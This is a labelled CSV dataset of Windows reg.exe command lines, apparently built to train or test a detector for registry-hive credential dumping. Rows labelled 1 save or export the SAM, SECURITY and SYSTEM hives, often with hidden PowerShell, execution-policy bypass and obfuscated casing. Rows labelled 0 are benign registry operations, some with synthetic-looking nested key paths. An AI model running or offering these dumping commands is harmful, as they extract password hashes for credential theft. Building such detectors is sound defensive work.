text,label
"CMd /c POweRSHELL -c ""ReG.EXE   SAvE   hkeY_lOcAl_machINE\SAm \.\C$acKuP.REg""",1
"reG  save  ""HkEY_locaL_MAcHinE\HkeY_LOcal_mAChINe\SofTwAre\WOw6432nodE""  ""D:\BAcKuP\REgISTRy_hIVE.daT""  /Y",0
"cmd /c reg unload ""hkcu\software\google\chrome\subkey91""",0
"Reg.ExE  aDd  ""HKCU\hKEY_lOCal_mAchinE\SOftWAre\pOLiCIES\MicroSoft""  /v lAsTuPDATE  /T rEG_sz",0
"REg   quErY   ""hkEY_LOcAL_macHIne\SoFTWAre\Classes""   /V VeRsIOn",0
cmD.exe /c StaRT /b reg.exe   ExPORT  HKeY_lOcAL_MaCHiNE\SecurITy  C:\WiNDOws\tEmp\saM.sAvE,1
reg.exe  save  hklm\sam  %temp%\sec_backup.dat,1
"REG  compaRE  ""hKeY_cUrrENt_UseR\hkEy_locAl_MachiNe\SySteM\curRENTcOntRoLset\cONTroL""  ""HkeY_curRENT_uSer\sOFtwaRe\mYAPP\SETTinGS_638""",0
"Cmd /C PoWErsHEll -c ""REG SAVE hkLm\SECUritY  %TEmp%\SeC_bAckUP.daT   /y""",1
"powershell -c reg.exe   delete   ""hkey_users\software\policies\mycorp\subkey79""   /v lastupdate",0
"rEG.ExE DELeTe ""hkU\sOFTwAre\GOOGLe\cHrOmE"" /V VersIon",0
pOWerShElL -Exec BypAsS -w HIDDen -C REG.ExE  sAvE  hKLm\sAM c:\TemP\sYStEM.hiVE,1
C:\wiNdOws\sysTeM32\CMd.EXE /k REG.Exe eXPOrT   hKlm\sAM  \.\c$aCKUP.reg   /Y,1
cmD.exe /c STaRt /B Reg saVe   HKEY_LoCAl_MAchInE\SYsTEm C:\Temp\SYstEm.HiVe,1
"powershell -c reg   add   ""hku\control panel\desktop\subkey49""   /v path      /d ""1.0.0""",0
cmd.Exe /c Reg   SaVE   hkEY_loCAL_mAChiNe\sEcURITy   c:\wiNdOwS\temp\Sam.SaVe,1
"REg UNloaD ""hKu\hkeY_LOCal_MAChiNE\sOFTwaRe\polIcIES\mIcrOsoFT"" /f",0
"cmd /C pOwErsHell -c ""rEG   ExpOrT HKEy_LocAl_MACHiNe\sYsTEm  c:\uSeRs\pUBlIC\registRy_ExpOrt.Reg   /y""",1
"CmD /C PowErsheLL -c ""Reg   SaVE  hklm\SECuRITy  c:\uSERS\pubLIc\rEgiSTRY_Export.reG /y""",1
"cmd /c powershell -c ""reg  save   hklm\security  c:\users\public\registry_export.reg""",1
cmd.EXE /c rEG.eXe  sAVE  Hkey_LOcaL_maChinE\SySTeM   c:\UseRs\pUBliC\ReGIstRy_expoRT.rEG  /Y,1
"reg.exe   delete   ""hkey_users\system\currentcontrolset\services\subkey57""   /v version",0
"powershell -c reg.exe  restore  ""hkey_current_user\software\microsoft\windows\currentversion\subkey37""  ""hkey_current_user\software\google\chrome_702""",0
"pOwERSHElL -c REG.Exe  coPy  ""hKu\HkEY_LocAl_mAChIne\soFTWarE\WoW6432node""  ""hkU\HKey_lOCAl_MACHine\softWARE\polIciEs\MICrosOft_165""",0
powershell -exec bypass -w hidden -c reg.exe  save hkey_local_machine\system c:\users\public\registry_export.reg,1
Cmd.eXe /C reg   exPOrT   hkEy_loCaL_MacHinE\sEcUrItY C:\USers\PUblIc\REGIstRY_eXPoRt.rEg,1
CmD.exe /C STart /b reg   export HkLm\SeCURiTy   \\LOcalhOST\c$\__dUMp\sAM.bAK  /Y,1
REG   EXPOrT HkLM\SYSTEm  C:\WINDowS\tEMp\SAm.sAve  /y,1
powershell -COmmand Reg.eXE  EXPoRt   hKLM\sYSTEM %tEMP%\SEC_baCkUP.DAt,1
"STarT /B REg.eXE  SavE  ""hKEy_LOcAL_MAcHiNe\sYSTeM\cURrENtcONtRoLSeT\SERvICES\suBkEy42""  ""c:\uSerS\pubLic\CHROMe_DaTa.baK""  /Y",0
pOWeRSHeLL -COMmanD rEG.exE  SaVE hKlm\seCUrITy c:\TeMP\sysTem.hiVe  /y,1
Reg ExPoRt  HkeY_lOcAL_maChINe\SYSTEm %TEMp%\sEC_bAcKUp.DAT,1
"reg.exe  unload  ""hkcu\control panel\desktop""  /v lastupdate",0
"PoweRSheLL -C rEg.eXE CompaRe ""HKEY_USERS\hKEY_local_mAcHiNe\sOftWARe\WOW6432nodE\sUBKEy13"" ""hKEY_USers\sOFTwARe\myapp\SEttINGs_402""",0
powershell -exec bypass -w hidden -c reg  export  hklm\system c:\users\public\registry_export.reg   /y,1
reg.exe save hkey_local_machine\sam   \.\c$ackup.reg,1
"cmd /c powershell -c ""reg   save   hkey_local_machine\sam  %temp%\sec_backup.dat   /y""",1
cmd.exe /c start /b reg   save hklm\system   %temp%\sec_backup.dat,1
cmd.exe /c reg.exe save hklm\security c:\temp\system.hive,1
"REG   DELeTe   ""hKEy_LOCAl_machinE\SYsTEm\cuRReNTCoNtroLset\sERvIcEs\sUbkey96""   /v PAth",0
"StArt /B REg.exE  UnlOAd  ""HkeY_uSeRS\CONTRol Panel\DEsKtop""",0
"reg.exe  delete  ""hkey_current_user\software\microsoft\windows\currentversion\subkey23""  /f",0
cmd.exe /c reg.exe   save hkey_local_machine\sam \.\c$ackup.reg,1
pOWeRsHeLL -eXEc BYPaSS -W HiDDEN -c REG.eXe ExPOrt  HKLM\saM \\locaLhosT\C$\__dUmP\Sam.bAk   /y,1
c:\windows\system32\cmd.exe /k reg  export  hkey_local_machine\security   \.\c$ackup.reg   /y,1
reg.exe,0
"reg.exe   restore   ""hkcu\hkey_local_machine\system\currentcontrolset\control\subkey17""   ""hkcu\environment_114""",0
"rEg.exE UNLoad ""HKeY_cUrrENT_UseR\sofTWARe\POlicies\MYcORp\subKey48"" /v LAStUPdaTe",0
cmd.exe /c start /b reg.exe  export hkey_local_machine\sam  %temp%\sec_backup.dat  /y,1
powershell -command reg  export  hklm\security   c:\windows\temp\sam.save /y,1
"Reg quErY ""HkCU\Hkey_lOCaL_maCHInE\SYSTem\cURreNTConTRolSEt\CoNTROl\sUBKeY46"" /v pAtH",0
"reg  copy  ""hkey_local_machine\software\policies\mycorp\subkey18""  ""hkey_local_machine\software\myapp\settings_793""",0
"start /b reg.exe copy ""hkey_users\software\google\chrome"" ""hkey_users\hkey_local_machine\system\currentcontrolset\control_288""",0
pwsh -noprofile -c reg  export hkey_local_machine\security   \\localhost\c$\__dump\sam.bak,1
"reG cOPy ""hkey_loCaL_MAChine\SOFtwaRe\mYapP\SEttiNGS\SUBkeY7"" ""HkEY_locAl_MacHINe\sOfTwaRE\gOoGLe\chrOMe_186""",0
c:\WINDowS\syStem32\cmd.exe /k REg.exe   SAVe hkEy_LoCaL_maChINe\sySTem \.\c$aCkUp.REG /Y,1
pwsh -noprofile -c reg export  hklm\sam   c:\temp\system.hive,1
REg   sAve   HKLm\SYSTEm   c:\wiNDOws\TEmp\sam.SAVe,1
REg.Exe   SAve  HKlm\SecurITY  %TEmP%\sEC_bAckuP.DaT /Y,1
cmd.exe /c reg.exe   export   hkey_local_machine\security   c:\temp\system.hive,1
reg.exe export  hkey_local_machine\sam %temp%\sec_backup.dat /y,1
"rEg  ResToRe  ""HKEy_locAl_Machine\eNVIRonMENT""  ""hkey_LoCal_MaCHiNE\SOFTWaRE\MIcROSOft\WindOwS\cURreNTVersIon_293""",0
"cmd /c powershell -c ""reg.exe   export   hkey_local_machine\sam c:\users\public\registry_export.reg""",1
"reg unload ""hku\system\currentcontrolset\services\subkey1"" /f",0
cMd.eXE /c STarT /b ReG.ExE  eXpoRt hKlm\SySTEm c:\useRs\publiC\RegistRy_EXpORT.ReG   /y,1
c:\wiNDows\system32\Cmd.EXe /K REg.eXE sAve   Hkey_Local_mACHiNE\sAM  C:\wiNDOWs\TEmP\SaM.sAve /y,1
"Cmd /C Reg   ADd   ""hkcU\Hkey_lOcaL_maCHiNE\SYsTEM\cURReNTCONTRoLSet\Control""   /v LasTUpdATE   /t ReG_sz   /d 1",0
"start /b reg   add   ""hkcu\hkey_local_machine\software\policies\microsoft\subkey31""   /v path      /d ""c:\program files\app""",0
"reG   reSTore   ""HkU\syStEm\cuRRentConTRolset\SErViCeS""   ""HKu\SoFTWare\micRoSOFt\wiNdoWS\cURreNtVerSIOn_312""",0
"reg.exe   query   ""hkcu\hkey_local_machine\system\currentcontrolset\control\subkey79""   /v lastupdate",0
"POWersHelL -C rEg  add  ""HKu\eNViRONMenT""  /F  /T reg_DWoRd",0
"cMD /c poWERSHELL -c ""rEg.EXE EXpOrT   hKlM\SECURiTY  c:\TEMp\SYstEM.hIvE  /Y""",1
cmd.exe /c reg.exe   export   hklm\security   \.\c$ackup.reg   /y,1
pwsh -NOprOFile -c REG.EXE eXpORT  HKEY_loCAl_MAcHine\sEcuritY  c:\temp\sYStEM.Hive   /Y,1
"reg   DeLETE   ""hkeY_cURreNT_UsEr\soFTWARe\myapp\SEtTings""",0
C:\wInDows\SYStEm32\Cmd.Exe /k Reg.Exe eXPOrT HKey_LOCAl_mACHINE\Sam C:\TEMp\SYStEm.HIve   /y,1
"powershell -c reg.exe restore ""hkey_local_machine\software\policies\mycorp"" ""hkey_local_machine\control panel\desktop_603""",0
"rEG.Exe  AdD  ""hkeY_usErS\soFtWArE\cLassES""  /V lasTupDate  /T Reg_Sz  /D ""c:\pROgRAM fILEs\apP""",0
c:\WINDoWs\sySTEm32\CmD.eXe /k Reg   sAvE hKEy_lOCal_MaChine\sECURITY  c:\wInDOws\TeMP\sAm.savE   /Y,1
poWERshEll -COMmaND rEG.Exe  ExPOrT   hKLM\syStEm  \.\c$AcKuP.rEg  /y,1
CMd.ExE /c ReG.Exe expORt  HKLm\sysTEm  \\LocalhOST\C$\__DUmp\Sam.bak   /Y,1
"stARt /b rEG uNLoad ""hkEy_LoCAl_mAchInE\coNtrol pANEl\DeSkTop\subkey62""",0
cmd.exe /c start /b reg.exe   export hkey_local_machine\system   c:\windows\temp\sam.save /y,1
"reg.Exe   sAve   ""hKEy_LOcal_machInE\HKEy_local_MachIne\SoftWarE\WOw6432NOde\sUbKEy14""   ""d:\BACkUP\REgIstRy_HiVE.dat""   /y",0
"reg.exe   delete   ""hkcu\system\currentcontrolset\services""",0
cMd.EXE /C sTArT /B reg.exE   eXPoRT  Hkey_LOCaL_maChIne\SYstEm  \.\c$ACkuP.Reg  /y,1
pwsH -nOPROfIle -C reG.eXe  exPorT hkLM\SEcURITy C:\TeMP\SYstEM.HiVE   /Y,1
cmD.EXe /C reG.Exe eXPoRt HkLm\saM %TemP%\sEC_bAckup.DAT,1
"sTart /B rEG AdD ""HKEY_CUrReNt_User\EnviROnMEnT"" /v vErSiOn  /D ""1.0.0""",0
cmd.exe /c reg   export   hkey_local_machine\security %temp%\sec_backup.dat /y,1
cmd.exe /c start /b reg.exe   export  hklm\system   %temp%\sec_backup.dat /y,1
ReG SAVE HKlM\sYSteM \.\C$acKUP.reg,1
"STaRT /b rEg  saVe  ""hkey_loCaL_maCHinE\Hkey_locAl_macHiNe\sOFtware\poliCIEs\micRosoFt""  ""C:\teMp\useR_seTtInGs.REg""",0
"cmd /c powershell -c ""reg export  hkey_local_machine\system  c:\users\public\registry_export.reg""",1
"reg   compaRe   ""HKU\hkEY_loCal_MaCHINE\softWARe\wow6432NODE""   ""hkU\SoftwARe\mYApP\seTtings_907""",0
"CMd /C ReG.eXE  QUerY  ""HKCu\CONTRol pAnel\DEsKtOP\SUbKEy17""  /F",0
powershell -exec bypass -w hidden -c reg  export hklm\sam  c:\windows\temp\sam.save /y,1
cmd.exE /C StaRT /B rEg.EXe  eXPORT HkLM\SECUritY   \.\C$ACKuP.reg,1
"rEg.eXe   COpY   ""hKeY_UsERS\hKEy_locaL_MAchInE\sysTEm\CUrRENtCONtRolSeT\coNtrol\SUBkEY29""   ""HKeY_uSers\sOFTwAre\poLicieS\MyCorP_515""",0
"CmD /c rEG.EXE saVE ""hKeY_lOCal_MachiNe\hkeY_lOcAl_MaChiNe\sySTEm\curreNtcoNTrolSEt\cONTRol\suBkEY59"" ""C:\USERs\puBLIC\cHRoME_DAtA.bAk"" /Y",0
C:\windOWS\SYSTEM32\cMd.eXE /k ReG   EXpORT   HKlm\sAm \\locaLHOSt\c$\__DumP\SaM.bak  /y,1
reg.exe   export hkey_local_machine\sam  c:\temp\system.hive  /y,1
"start /b reg.exe   copy   ""hkey_current_user\software\policies\mycorp""   ""hkey_current_user\control panel\desktop_286""",0
"cmd /c powershell -c ""reg  export hklm\security c:\temp\system.hive""",1
"start /b reg  compare  ""hkey_users\software\microsoft\windows\currentversion""  ""hkey_users\hkey_local_machine\software\policies\microsoft_429""",0
"reG  savE  ""HKEy_lOcAL_macHiNe\hkeY_locAL_MAchINe\syStEM\CuRreNtConTroLSEt\coNTRoL""  ""c:\wiNdOWs\tEmp\soFTWare_DUmp.DAt""",0
CMd.Exe /C staRT /b REG  ExPort   hkeY_locaL_MACHiNE\sam   %temP%\SeC_baCKup.Dat,1
"REG.exE restoRe ""hkEy_usErs\sOFtwAre\ClaSsEs\SubKEy51"" ""hkEy_uSERS\EnVIROnmenT_925""",0
cMD.ExE /C stArt /B rEg.Exe  saVe  HKEy_LOCAL_macHInE\Sam  c:\TEMp\sySteM.hIve,1
"CmD /c reG  qUeRy  ""HKCu\sOFTwaRe\GOOglE\chromE\SubKEY41""  /v verSIOn",0
"powershell -c reg   query   ""hkey_current_user\system\currentcontrolset\services\subkey40""   /v path",0
powershell -exec bypass -w hidden -c reg  save   hklm\security  \.\c$ackup.reg   /y,1
c:\WIndows\SySTeM32\Cmd.exE /k reg.eXE   savE   hkEy_LOCAL_macHiNE\sam \\localHOsT\c$\__DUmp\sAM.BAK  /Y,1
powershell -command reg export hkey_local_machine\sam   c:\windows\temp\sam.save,1
reg export  hkey_local_machine\security  %temp%\sec_backup.dat   /y,1
PowerSHelL -cOmMAnd rEG.Exe saVe HkLm\SECURItY   C:\wIndoWs\TEMP\SAM.saVE,1
"pOweRsheLl -C REG  deleTe  ""hKEY_uSerS\sofTWare\MyaPp\seTtingS""  /v PATH",0
pOwErshelL -EXEc BYPass -W HidDeN -c reG   sAVe  HKlM\SAm \.\c$ACkup.reG,1
CMd.eXE /c rEG  export   Hklm\sYsTEM %teMp%\Sec_BAckUp.DAt   /y,1
Cmd.eXe /C Reg.eXE   EXporT hkLM\sYsTEm   c:\uSers\pUBLic\reGISTry_ExPoRT.reg,1
ReG.exE   SaVe  hkLm\secURitY \\lOCaLHOSt\c$\__dUmp\saM.bAk /Y,1
poWeRShEll -commANd rEg Save  hKlm\sAm  c:\WIndOws\TeMP\SAm.SavE /y,1
"cmd /c powershell -c ""reg  export  hklm\security   c:\users\public\registry_export.reg""",1
"reG   QuERY   ""HkEY_uSERS\enviRonmeNt""",0
"Cmd /c poweRsHELl -C ""reg   SaVe  hKLm\saM   \\lOcAlHOST\c$\__DuMp\SAm.baK""",1
cMd.eXe /c rEg   save  HklM\SYsTem c:\useRS\pubLiC\REGIStry_expORT.REg  /y,1
"reg  add  ""hku\software\classes""  /v version  /t reg_sz  /d ""c:\program files\app""",0
reg   export  hklm\system c:\windows\temp\sam.save /y,1
reg.EXe savE  hKlm\sAM   \.\c$acKUP.ReG   /y,1
cmD.ExE /C rEg.EXe sAvE  HkLm\SEcuRITY   c:\WINDows\temP\SAm.sAve,1
C:\WinDOwS\systEm32\cMd.exE /k REG.eXE   ExPort  hkEy_lOcAl_MAchine\SEcUrITY c:\TEmp\SYstEm.HIVe /Y,1
"powershell -c reg   save   ""hkey_current_user\hkey_local_machine\system\currentcontrolset\control""   ""%temp%\non_sensitive.hive""",0
CmD.eXe /c sTarT /b REg   EXpoRT  HkLM\sYsTeM c:\wInDoWS\tEMp\SAM.SAvE  /y,1
"reG QuERY ""hKeY_curRENT_uSeR\SoFtwaRE\mYApP\SeTtINGS\SUBKey85"" /v veRSiON",0
"reg  restore  ""hku\system\currentcontrolset\services""  ""hku\environment_204""",0
"reg   dELEte   ""HKeY_UsERS\enVIrOnMEnt""   /V VersiON",0
"REG rESTORe ""HkCu\COnTrOl PaNel\DEsKtOP\SuBKEY21"" ""HKCU\soFTWAre\Google\CHrOME_201""",0
"stARt /B Reg.exE   cOMpaRE   ""hkcU\ContRol PanEL\dEsKtoP""   ""hkcU\hkey_locaL_MacHInE\systEM\CuRRENtCoNTroLSeT\CONtROl_921""",0
PowErsHELl -cOMmanD Reg.exe  expoRt  hkEY_LoCAl_MachINE\SeCURITy  \.\c$ackUp.REg,1
cmd.exE /c rEG   ExporT  hKEy_LOcaL_MAchInE\SECuRItY C:\TEmp\sYSTEm.hiVE,1
"cmD /C REg  RESToRe  ""hkey_uSeRS\SoftwAre\myapP\sEttiNgS""  ""HKEY_users\hkeY_LOCal_MACHInE\softWaRE\poLICIEs\MiCrosoFT_144""",0
"REG.eXe   ComPaRe   ""hKEY_uSErS\SOfTWaRE\GoOgLe\cHROmE""   ""HkEy_UsErs\HkEY_LOcAl_MaCHiNE\SoFTwarE\WoW6432NodE_571""",0
cmd.exe /c start /b reg.exe   export hklm\sam \.\c$ackup.reg,1
"cmd /c powershell -c ""reg save   hklm\sam  c:\temp\system.hive  /y""",1
POwersHell -CoMMaNd REg  exPorT   hKLm\saM %tEmP%\sec_BAckUP.DAt,1
reg.Exe   eXPort hkeY_LOCAL_maChIne\SEcurITY C:\uSerS\PUBLIC\rEgIStrY_exPOrt.REg  /Y,1
rEG saVE  HKlm\sam   \.\C$acKup.rEG,1
"REg  QUErY  ""hkU\SOfTWArE\CLasseS""  /F",0
"CMD /C PowErSHeLl -c ""Reg  expoRt HkEy_lOCaL_maChiNe\SeCuRITy  \.\c$ACkUP.rEg""",1
"reg   compare   ""hkcu\hkey_local_machine\system\currentcontrolset\control\subkey84""   ""hkcu\environment_657""",0
c:\windows\system32\cmd.exe /k reg save   hkey_local_machine\system   c:\temp\system.hive /y,1
"reg.EXe copy ""HkU\sYStEm\curReNTcONtrolSEt\serVIcES\SUBKeY75"" ""hKu\SYstEm\cuRRenTcONtroLsET\sErVIcEs_907""",0
CmD.eXE /c REg.exE  eXpOrT   HkEy_LOcAL_machinE\seCuRITY c:\wiNdoWS\teMP\SAm.sAVE /Y,1
"reg.exe compare ""hkey_current_user\software\classes"" ""hkey_current_user\environment_840""",0
cmd.exe /c start /b reg.exe save  hkey_local_machine\security c:\temp\system.hive /y,1
"cmd /c reg   delete   ""hku\hkey_local_machine\system\currentcontrolset\control""   /v path",0
"CMD /c Reg  coMpARe  ""hkeY_curRENt_USer\sOFTwarE\microSoft\winDows\cUrReNtVeRSiON""  ""HkEY_cURRENt_UsER\CONtrOl PAnEl\dESkTop_945""",0
"cmd /c reg delete ""hkey_users\environment\subkey42"" /v lastupdate",0
powershell -exec bypass -w hidden -c reg  export   hkey_local_machine\system  c:\temp\system.hive   /y,1
cmD.ExE /C REG.eXe  SaVe  hKeY_LocaL_macHINE\SYsteM   c:\TEmP\sYStem.Hive,1
"REG  QUerY  ""HKEy_useRS\eNvIRonmeNT""  /V lasTupDATE",0
"powershell -c reg.exe   unload   ""hkey_local_machine\environment""   /f",0
"cmd /c reg.exe  query  ""hku\environment\subkey58""  /v lastupdate",0
rEG   SaVE   HkeY_LOcAl_maCHInE\SYsteM   \\lOCaLHost\c$\__Dump\saM.BAk,1
"reg  copy  ""hkey_users\software\microsoft\windows\currentversion""  ""hkey_users\software\classes_113""",0
PoWeRSheLl -COMmAnD reg  SAVE   hkLM\SaM  %temp%\SEC_BAcKUp.dAT  /y,1
"rEg.ExE   rEsTOrE   ""hkEY_LoCaL_MAcHinE\softwARE\gOoGLe\cHRome""   ""hkEy_locAL_mAChiNe\sOftwARe\miCrOsoFT\WIndoWs\cuRreNTversiOn_749""",0
reg.exe   export  hklm\system  \.\c$ackup.reg,1
"CMD /c pOwerSHell -C ""reg.EXe   ExpOrt   hKey_LOCAl_maChIne\SEcuRity  c:\WiNDoWS\TeMp\sAm.saVE   /Y""",1
PWsH -nOProFILE -C Reg   eXPOrT  hkEY_LoCaL_mAChiNE\sam \.\c$ACKUP.Reg  /y,1
"REg.Exe DELEtE ""HKcU\systEm\CURReNtcoNTRolset\SErVICEs"" /F",0
CMD.exe /c staRT /b reG.Exe saVe  hKlM\SeCuRity   \\loCAlhosT\C$\__Dump\SAM.bAK,1
"reg copy ""hku\software\microsoft\windows\currentversion\subkey76"" ""hku\hkey_local_machine\system\currentcontrolset\control_282""",0
"cMd /c reG ADD ""HkEY_cUrrEnT_UsER\sysTEm\CURrENTcontrOlSeT\ServiCeS\subKEY52"" /v LasTupdate /T ReG_sz /D ""1.0.0""",0
"reg COmpaRE ""HKEY_LOCal_MAchINE\softwAre\mIcROSOFT\WiNdows\CuRReNTvERsION\SUbkEY9"" ""HKEY_locAL_mAcHiNE\cONTROL panEL\DESktop_390""",0
"cmd /c powershell -c ""reg.exe save   hklm\security c:\temp\system.hive  /y""",1
POWERSHELl -eXec bYpass -W HIDDen -c REg   save   hkLm\SaM  C:\USers\PuBlIc\REgISTry_exPoRt.ReG,1
"cMD /c pOweRshElL -C ""REG.eXE   EXport hkEY_LoCal_mACHiNE\sAM \\lOcaLhosT\c$\__dUmp\sam.bAk""",1
powershell -exec bypass -w hidden -c reg.exe   export   hklm\sam c:\users\public\registry_export.reg  /y,1
"powERSHEll -c REG   ReSToRe   ""hKeY_UserS\hKEy_lOcaL_MAChINE\SOFtWARE\woW6432nodE\SUbkEy25""   ""hKeY_UseRs\soFTwArE\MYaPP\SeTtINgs_697""",0
"reg.exe  query  ""hkey_current_user\software\myapp\settings""  /v version",0
PoWErshEll -cOmmand reg   EXpORt   hKEY_loCAL_mAchiNe\SAm \\LocAlhost\c$\__DuMP\sam.BAk,1
c:\WindowS\sySTem32\cmD.EXE /k rEg sAve hKLM\saM   C:\TEmp\sYsTEM.HIve,1
"POwErSheLL -c Reg COmpaRE ""Hkey_locaL_Machine\softwARe\gOoGlE\ChRomE\SUBKEy48"" ""hkEy_LoCal_mACHINE\SofTwarE\mIcRoSoft\winDOWs\cUrREntveRSiOn_790""",0
cMd.Exe /C REG.EXE SaVE HkeY_LoCaL_maCHiNE\SYstEm  C:\winDoWs\tEMp\SAM.savE  /y,1
pWsh -nOpROfIle -c reG  SAVE  HKLm\sYSTEM   C:\wINDowS\tEMP\saM.SavE,1
"reg.exe query ""hkey_users\hkey_local_machine\software\wow6432node\subkey56"" /f",0
PoweRShELl -CoMMAnd ReG.exe  expoRT  hklm\SAm C:\WindOws\tEmp\SAM.save /Y,1
"rEg   ADD   ""Hkey_currenT_usER\SYsteM\CURrENtcontROLsET\sErvicES""   /V VErsIOn   /t rEg_Sz   /d 1",0
"CmD /C REG.ExE   deLeTE   ""HkCU\eNViroNMeNT\sUbkey29""",0
pOwErsHeLL -cOmmand Reg.ExE  sAVe  HKlm\SeCURiTY  c:\usERS\PUBlIC\rEGistRy_eXPort.rEG /y,1
"Reg.Exe  CoMPare  ""hKU\soFtWaRe\MyapP\SETtIngs""  ""hkU\HkEy_Local_MACHIne\SOfTWarE\wOw6432noDE_754""",0
c:\WInDOWs\SYSTem32\cmd.Exe /K REg.EXe   ExPoRT  HKLm\systeM   c:\uSErs\PuBlIc\regIstRy_eXPort.Reg,1
"ReG  aDD  ""hKU\enVIRoNment\suBkeY27""  /v lAsTuPdaTe  /T rEg_sZ  /d 1",0
cmd.exe /c start /b reg  save hklm\security \\localhost\c$\__dump\sam.bak  /y,1
"reG  coPY  ""HKEy_Local_MAcHine\SoFtWaRE\CLASseS\subKeY30""  ""hKEy_LOCaL_maChine\hkeY_LOCAl_MacHINE\SOfTwARe\pOLICies\MiCrOSoFT_551""",0
"reg  restore  ""hkcu\software\microsoft\windows\currentversion\subkey24""  ""hkcu\software\microsoft\windows\currentversion_181""",0
"start /b reg  add  ""hkey_current_user\hkey_local_machine\system\currentcontrolset\control\subkey43""    /t reg_dword  /d 1",0
cMD.exe /C stArT /b reg  sAve   hKLm\sECUrity %TemP%\seC_baCkUP.Dat   /Y,1
pwsH -NoProFILE -C Reg   SAVE hKlm\secURiTY   C:\winDowS\Temp\sAm.sAve  /Y,1
cmD.EXe /c staRt /b rEg   sAVe   hKEY_LOcAL_maChiNe\SysteM %TEMp%\SEc_BAcKuP.daT,1
Cmd.Exe /C Reg   SAvE hKey_LOCAL_maCHine\SAM %tEmP%\sEc_BacKup.DaT /y,1
ReG.ExE  eXport HKLm\SEcURity  \\loCaLhOst\C$\__dUmP\saM.BAk  /y,1
"PoWErsheLl -C reG   unlOAd   ""hKEY_lOCAL_mAcHINE\SoftWaRe\ClAsSeS\SUbkey47""   /v laStUpDATE",0
PwSh -NoprofiLE -C ReG.ExE SAve   hklm\saM  %TEMP%\SEC_BaCKup.dat,1
"reg  add  ""HKu\coNtROl panel\deSktoP\SUbkeY45""  /V vErsioN    /d 1",0
"Reg.Exe   resToRE   ""HkeY_LOcal_MAcHInE\control PaNeL\desKTOP""   ""HKEy_lOcaL_MAChIne\soFtWarE\MYApP\SETTIngS_184""",0
"reg.exe   save   ""hkey_local_machine\hkey_local_machine\software\wow6432node\subkey9""   ""d:\backup\registry_hive.dat""   /y",0
powershell -command reg save   hkey_local_machine\security c:\temp\system.hive /y,1
"POWErShElL -c reG  cOmparE  ""HKEY_LOcAL_MACHinE\ENvIrOnMENt\SUBKeY8""  ""hKEy_loCaL_MACHinE\soFTWare\clAsses_759""",0
REG.Exe  SAVE  hkeY_lOCal_mAChINE\sYSTEm   \\lOcAlhOsT\C$\__dump\sAM.bAk   /y,1
"reg   UNlOAD   ""hKu\SOfTwaRe\mYApP\SeTtiNGs\suBkeY16""",0
cmd.exe /c start /b reg   export  hklm\system c:\users\public\registry_export.reg   /y,1
"Cmd /c rEG.Exe  COmparE  ""hKU\sYstEm\CUrrenTcONTrOLsET\sERVicES""  ""HKU\SOFtwArE\micRoSoFT\WinDowS\cuRrEnTVeRSiOn_138""",0
"Reg.eXE  ADD  ""Hku\hKEy_lOCal_MAcHIne\sOFtWArE\wOW6432NoDE\suBKEy36""  /v paTh  /T rEG_sz  /d ""c:\PrOgRaM FIles\aPp""",0
pOweRShELL -ComMAnD ReG   SAVe   HkeY_lOCaL_maCHinE\securIty c:\USers\puBLIC\RegisTRY_exPORT.rEg /Y,1
"cmd /c powershell -c ""reg.exe export  hklm\system  c:\windows\temp\sam.save""",1
"REG.ExE  deLETE  ""HKEY_LoCal_MaChinE\sYStEm\CUrreNTConTrolSet\sErvICES""",0
"reG.eXe DelETE ""hkcu\sOfTwArE\mYaPP\SEttiNgS"" /v paTH",0
rEG   SaVe   HKlM\Sam   %TemP%\seC_baCkUP.daT  /Y,1
"poWeRsHell -C ReG   UNloAd   ""HkEy_USerS\hKeY_LoCAl_mACHiNe\sOFtwArE\POLICIEs\MiCRosoft\SUBkEy84""   /F",0
"powERshEll -C Reg.EXe   rESToRe   ""HkeY_users\sOfTware\CLassEs""   ""hkEY_uSERs\hkeY_loCAl_MaCHinE\sOfTWARe\wOW6432NoDE_707""",0
"powershell -c reg.exe  restore  ""hkey_local_machine\software\myapp\settings\subkey53""  ""hkey_local_machine\hkey_local_machine\software\wow6432node_105""",0
C:\WinDows\sysTeM32\cMd.ExE /k rEG.exe   eXport hKEy_loCAl_mAcHINE\sEcurITY   %TeMP%\sEc_bACkUp.dAT /y,1
"rEg.eXE sAVe ""hkeY_LoCAl_MaCHINE\hkey_LOCal_mAcHINE\sofTwaRe\WOw6432noDE"" ""C:\temp\UsEr_sEttIngs.reG"" /Y",0
c:\windows\system32\cmd.exe /k reg.exe   save  hklm\security  c:\windows\temp\sam.save   /y,1
"REG   ADd   ""hKU\sOFtwarE\Myapp\SeTtiNGS\sUbkEY50""   /v PaTh",0
